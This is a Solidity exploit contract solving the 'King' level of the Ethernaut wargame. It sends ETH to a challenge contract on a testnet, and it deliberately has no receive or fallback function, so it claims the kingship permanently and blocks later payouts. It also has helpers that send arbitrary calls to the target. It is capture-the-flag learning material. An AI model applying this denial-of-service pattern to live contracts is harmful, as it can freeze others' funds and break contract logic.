// Solution to level "King" of Ethernaut challenges
// How to attack?
// Deploy this contract
// At the same time have this contract send required eth to the target contract
// Implement no receive or fallback functions
// Submit instance

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.24;

contract KingAttacker {
    address target = 0x11915D8Ceb32a8C47d084d1E3D0378562CB72D38; // DEPLOYED ON OP SEPOLIA

    constructor() payable {
        (bool success,) = payable(target).call{value: msg.value}("");
        require(success, "Attack failed!");
    }

    function getDataToCall(string memory _dataToHash) public pure returns (bytes memory) {
        return abi.encodeWithSignature(_dataToHash);
    }

    function callTargetWithData(bytes calldata _dataToCall) public returns (bytes memory) {
        (bool success, bytes memory data) = target.call(_dataToCall);
        require(success, "Call failed!");
        return data;
    }
}